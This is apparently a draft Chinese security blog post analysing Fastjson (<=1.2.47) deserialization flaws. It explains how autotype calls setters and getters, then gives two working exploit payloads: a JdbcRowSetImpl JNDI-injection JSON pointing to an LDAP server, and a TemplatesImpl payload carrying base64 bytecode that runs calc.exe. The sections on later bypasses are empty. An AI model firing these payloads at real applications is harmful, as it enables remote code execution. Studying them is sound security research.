---
title: "Fastjson 低版本反序列化漏洞分析"
date: 2023-01-03T21:16:50+08:00
lastmod: 2023-01-03T21:16:50+08:00
draft: true
author: "X1r0z"

tags: ['fastjson', 'jndi']
categories: ['Java安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

不得不说 fastjson 的漏洞实在太多了, 堪称 Java 界的 thinkphp...

两三天肯定研究不完, 只好先简单记录下对于低版本 fastjson (<= 1.2.47) 利用方式的学习

高版本的绕过日后再补充...

<!--more-->

## Fastjson 基本使用

>  Fastjson 是阿里巴巴的开源 JSON 解析库, 它可以解析 JSON 格式的字符串, 支持将 Java Bean 序列化为 JSON 字符串, 也可以从 JSON 字符串反序列化到 JavaBean.

序列化/反序列化过程中涉及到的几个方法

```java
JSON.toJSONString(obj)
JSON.parse(text)
JSON.parseObject(text)
```

测试类

```java
package com.example;

public class Person{
    private String name;
    private int age;

    public String field1 = "hello";
    private String field2 = "world";


    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public Person() {
        System.out.println("constructor");
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }

    public void setAge(int age) {
        System.out.println("setAge");
        this.age = age;
    }
}
```

简单序列化/反序列化

```java
System.out.println("toJSONString:");
Person person = new Person("xiaoming", 12);
String data = JSON.toJSONString(person); // getter
System.out.println(data);

System.out.println("parse:");
Object obj2 = JSON.parse("{\"age\":12,\"name\":\"xiaoming\"}"); // none, JSONObject
System.out.println(obj2.getClass());

System.out.println("parse with autotype:");
Object obj3 = JSON.parse("{\"@type\":\"com.example.Person\",\"age\":12,\"name\":\"xiaoming\"}"); // setter, Person
System.out.println(obj3);

System.out.println("parseObject:");
Object obj4 = JSON.parseObject("{\"age\":12,\"name\":\"xiaoming\"}"); // none, JSONObject
System.out.println(obj4.getClass());

System.out.println("parseObject with clazz:");
Object obj5 = JSON.parseObject("{\"age\":12,\"name\":\"xiaoming\"}", Person.class); // setter, Person
System.out.println(obj5.getClass());

System.out.println("parseObject with autotype:");
Object obj6 = JSON.parseObject("{\"@type\":\"com.example.Person\",\"age\":12,\"name\":\"xiaoming\"}"); // getter and setter, JSONObject
System.out.println(obj6.getClass());
```

![image-20230104140014806](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041400867.png)

总结

- toJSONString 会调用 getter

- parse
  - 不指定 autotype 时仅会将 json 反序列化为 JSONObject
  - 指定 autotype 时会调用对应 Java Bean 的无参 constructor 和 setter

- parseObject

  - 不指定 autotype 时同样仅会反序列化为 JSONObject

  - 传入 expectClass 时会调用 Java Bean 的无参 constructor 和 setter

  - 指定 autotype 时会先调用 Java Bean 的无参 constructor 和 setter, 然后调用 getter 将其转换为 JSONObject

parseObject 本质上调用的还是 parse

![image-20230104140906161](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041409187.png)

返回时判断是否为 JSONObject, 如果不是的话就会调用 toJSON 方法将 Java Bean 转换为 JSONObject

也就是说其实 parseObject 调用 getter setter 的过程可以拆成两步: 第一步调用 parse 将 json 转换为 Java Bean 时会调用 setter, 第二步调用 toJSON 将其转换为 JSONObject 时会调用 getter

这里还有两个小细节

- 如果某个属性被 public 修饰, 那么即使没有 getter 和 setter 也能够成功地被序列化/反序列化

- 如果某个属性被 private / protected 修饰, 但没有对应的 getter 和 setter, 那么就不会被序列化, 反序列化时即使在 json 中传入对应的值, 最终也会显示 null

对于第二种情况, 如果非要反序列化, 就需要在调用 parse / parseObject 时传入 `Feature.SupportNonPublicField`

```java
Object obj1 = JSON.parse(text, Feature.SupportNonPublicField);
Object obj2 = JSON.parseObject(text, Feature.SupportNonPublicField);
```

最后简单说一下, fastjson autotype 机制的初衷其实是为了更好的支持 Java Bean 的序列化/反序列化. 通过在 json 中指定 `@type` 就可以在反序列化的时候将 json 对象自动转换为对应的 Java Bean, 无需我们手动指定 Class, 从而实现了自动类型识别

调用 toJSONString 时传入 `SerializerFeature.WriteClassName` 就可以生成 `@type`

```java
Person person = new Person("xiaoming", 12);
String data = JSON.toJSONString(person, SerializerFeature.WriteClassName);
System.out.println(data);
```

![image-20230104142740059](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041427089.png)

## Fastjson 反序列化漏洞 (<=1.2.24)

**fastjson 反序列化漏洞的根本原因就是它能够通过 autotype 机制去调用任意类的 setter / getter**

我们只需要找到一条能够利用 setter / getter 来触发恶意操作的利用链即可

### JdbcRowSetImpl 利用链

JdbcRowSetImpl 利用链最终会造成 jndi 注入, 限制条件是目标环境必须出网

payload

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Basic/Command/calc","autoCommit":true}
```

![image-20230104145255120](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041452389.png)

很简单的 jndi 注入

![image-20230104145430738](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041454773.png)

![image-20230104145458719](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041454772.png)

跟进一下 fastjson 的处理流程

前面是一堆 parse

![image-20230104150022600](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041500749.png)

![image-20230104150043636](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041500746.png)

![image-20230104150127507](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041501609.png)

到这步解析器会解析到 `@type` 这个 key, 然后会从 `this.config` 中获取对应的 deserializer

![image-20230104150249429](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041502492.png)

跟进 getDeserializer 方法

![image-20230104150349354](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041503478.png)

前面经过一系列的判断, 然后创建 JavaBeanDeserializer

再往后就是调用 `deserializer.deserialze()` 来反序列化内容, 生成 Java Bean

这里面涉及到很多词法分析的内容, 我是真的看不懂了...

### TemplatesImpl 利用链

TemplatesImpl 利用链执行任意 Java 字节码, 原理是根据 `_outputProperties` 去调用 `getOutputProperties` 这个 getter (fastjson 会自动忽略下划线)

看起来很不错但实际上有很多限制

首先 TemplatesImpl 有很多被 private 修饰的属性, 但这些属性很多都没有对应的 getter 和 setter

![image-20230104152714054](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041527085.png)

要想成功反序列化的话必须得传入 `Feature.SupportNonPublicField`

然后它是通过调用 getter 来触发的, 这就限制了调用的方法只能是 parseObject

所以这个链实际上并没有 JdbcRowSetImpl 那么通用

payload

```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_name":"hello","_tfactory":{},"_bytecodes":["yv66vgAAADQANQoACAAlCgAmACcIACgKACYAKQcAKgoABQArBwAsBwAtAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAlTGNvbS9leGFtcGxlL0NvbW1vbnNDb2xsZWN0aW9ucy9FdmlsOwEADVN0YWNrTWFwVGFibGUHACwHACoBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALgEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALwwAMAAxAQAIY2FsYy5leGUMADIAMwEAE2phdmEvbGFuZy9FeGNlcHRpb24MADQACgEAI2NvbS9leGFtcGxlL0NvbW1vbnNDb2xsZWN0aW9ucy9FdmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAfAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAwAMAAAAGgAGAAAAGAAEABoADQAdABAAGwARABwAFQAeAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAASAAAAEAAC/wAQAAEHABMAAQcAFAQAAQAVABYAAwALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAACMADQAAACAAAwAAAAEAEAARAAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAHQAAAAkCABcAAAAZAAAAAQAVAB4AAwALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAACgADQAAACoABAAAAAEAEAARAAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAB0AAAANAwAXAAAAHwAAACEAAAABACMAAAACACQ="],"_outputProperties":{}}
```

![image-20230104153358953](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041533061.png)

调试流程就不写了, TemplatesImpl 这条链之前遇到过很多次

然后这个 payload 的构造有几个注意点

第一点是 fastjson 在处理 byte 数组时会将其进行 base64 转换: 序列化时 base64 编码, 反序列化时 base64 解码

![image-20230104154326079](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041543198.png)

![image-20230104154340267](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041543367.png)

其实不用看源码, 自己序列化试试也能知道

第二点是 fastjson 会按照 json 的顺序从左往右依次调用 getter, 所以需要保证 json 中的 `_outputProperties` 在最后一个位置

### BasicDataSource 利用链





## Fastjson 高版本绕过

### 1.2.25 - 1.2.41



### 1.2.42



### 1.2.43



### 1.2.44



### 1.2.45



### 1.2.47



### 1.2.48





